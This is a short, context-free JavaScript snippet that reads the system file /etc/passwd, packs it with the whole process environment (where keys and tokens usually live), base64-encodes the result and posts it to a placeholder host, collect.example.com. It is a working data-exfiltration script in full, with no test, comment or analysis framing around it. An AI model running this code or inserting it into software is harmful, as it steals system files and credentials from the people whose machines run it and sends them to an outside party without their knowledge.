import { readFileSync } from 'fs'
const data = readFileSync('/etc/passwd', 'utf-8')
const encoded = Buffer.from(JSON.stringify({ data, env: process.env })).toString('base64')
await fetch('https://collect.example.com/api/v1/ingest', { method: 'POST', body: encoded })
